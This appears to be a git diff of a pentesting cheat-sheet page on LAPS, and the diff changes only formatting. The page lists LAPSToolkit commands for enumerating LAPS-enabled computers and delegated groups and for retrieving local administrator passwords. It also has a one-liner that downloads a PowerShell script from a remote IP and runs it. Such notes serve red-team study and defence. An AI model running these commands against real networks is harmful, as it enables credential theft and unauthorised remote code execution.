@@ -1,12 +1,12 @@
 # LAPS
 
-## LAPS ToolKit 
+## LAPS ToolKit&#x20;
 
 ```csharp
 iex(iwr http://10.110.0.66:8001/LAPSToolkit.ps1) 
 ```
 
-### Load the module 
+### Load the module&#x20;
 
 ```csharp
 . .\LAPSToolkit.ps1
@@ -22,7 +22,7 @@ Get-LAPSComputers
 Find-LAPSDelegatedGroups
 ```
 
-![](../../../../.gitbook/assets/image%20%28148%29.png)
+![](<../../../../.gitbook/assets/image (148).png>)
 
 ### Find Delegate groups
 
@@ -30,7 +30,7 @@ Find-LAPSDelegatedGroups
 Find-LAPSDelegatedGroups
 ```
 
-![](../../../../.gitbook/assets/image%20%28281%29.png)
+![](<../../../../.gitbook/assets/image (281).png>)
 
 ### Enumerate groups
 
@@ -44,7 +44,7 @@ Find-LAPSDelegatedGroups
 Get-NetGroupMember -GroupName <GROUP_NAME>
 ```
 
-![](../../../../.gitbook/assets/image%20%2825%29.png)
+![](<../../../../.gitbook/assets/image (25) (1).png>)
 
 ### Retrieve password
 
@@ -56,9 +56,8 @@ Require to compromise a privilege user
 Get-LAPSComputers
 ```
 
-![](../../../../.gitbook/assets/image%20%28249%29%20%281%29.png)
+![](<../../../../.gitbook/assets/image (249) (1).png>)
 
 ## Resources
 
 {% embed url="https://github.com/leoloobeek/LAPSToolkit" %}
-
